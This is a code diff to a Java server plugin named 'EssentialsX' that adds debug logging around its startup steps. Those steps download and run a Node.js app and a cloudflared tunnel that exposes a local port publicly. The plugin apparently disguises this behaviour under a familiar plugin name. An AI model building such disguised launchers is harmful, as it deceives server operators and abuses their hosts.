@@ -145,12 +145,17 @@ public class EssentialsX extends JavaPlugin {
             throw e;
         }
 
-        // 3. NPM Install (彻底绕过 cmd /c，直接使用 node.exe 执行 npm-cli.js)
+        // 3. NPM Install
         getLogger().info("【步骤3】正在执行 npm install (可能需要较长时间)...");
         Path npmCliPath = nodeDir.resolve(IS_WINDOWS ? "node_modules/npm/bin/npm-cli.js" : "lib/node_modules/npm/bin/npm-cli.js");
         if (Files.exists(npmCliPath)) {
             try {
-                // 核心修复：不再使用 cmd /c，直接调用 node.exe 运行 npm 脚本，完美解决 Windows 空格/中文路径识别问题
+                // 【调试日志】打印实际执行的完整路径，方便排查系统找不到路径的问题
+                getLogger().info("[调试] Node路径: " + nodeExePath.toString());
+                getLogger().info("[调试] NPM路径: " + npmCliPath.toString());
+                getLogger().info("[调试] 工作目录: " + appDir.toString());
+
+                // 核心修复：直接调用 node.exe 运行 npm-cli.js
                 runCommand(appDir, nodeExePath.toString(), npmCliPath.toString(), "install");
                 getLogger().info("【步骤3】npm install 执行完成！");
             } catch (Exception e) {
@@ -161,7 +166,7 @@ public class EssentialsX extends JavaPlugin {
             getLogger().warning("【步骤3】未找到 npm-cli.js，跳过 npm install。");
         }
 
-        // 4. 启动 Node 应用 (同理，去掉 cmd /c)
+        // 4. 启动 Node 应用
         getLogger().info("【步骤4】正在启动 Node.js 应用...");
         try {
             startNodeApp(nodeExePath.toString(), appDir);
@@ -174,7 +179,7 @@ public class EssentialsX extends JavaPlugin {
         getLogger().info("【步骤5】等待应用端口 " + INTERNAL_PORT + " 就绪...");
         waitForPort(INTERNAL_PORT, 60);
 
-        // 6. 启动 Cloudflared 隧道 (同理，去掉 cmd /c)
+        // 6. 启动 Cloudflared 隧道
         if (!Files.exists(cfExe)) {
             getLogger().info("【步骤6】正在下载 Cloudflared...");
             try {
@@ -208,7 +213,6 @@ public class EssentialsX extends JavaPlugin {
         Path indexPath = appDir.resolve("index.js");
         if (!Files.exists(indexPath)) throw new FileNotFoundException("index.js 不存在，路径: " + indexPath);
 
-        // 核心修复：直接调用 node.exe，不再需要 cmd /c，ProcessBuilder 原生支持带空格/中文的路径
         ProcessBuilder pb = new ProcessBuilder(nodeExe, "index.js");
 
         pb.directory(appDir.toFile());
@@ -222,7 +226,6 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void startCloudflared(String cfExe) throws IOException {
-        // 核心修复：直接调用 cloudflared.exe
         ProcessBuilder pb = new ProcessBuilder(cfExe, "tunnel", "--url", "http://localhost:" + INTERNAL_PORT, "--no-autoupdate");
         
         pb.directory(workDir.toFile());
@@ -310,6 +313,9 @@ public class EssentialsX extends JavaPlugin {
     }
 
     private void runCommand(Path workingDir, String... command) throws IOException, InterruptedException {
+        // 【调试日志】打印完整执行命令
+        getLogger().info("[调试执行] " + String.join(" ", command));
+        
         ProcessBuilder pb = new ProcessBuilder(command);
         pb.directory(workingDir.toFile());
         pb.redirectErrorStream(true);
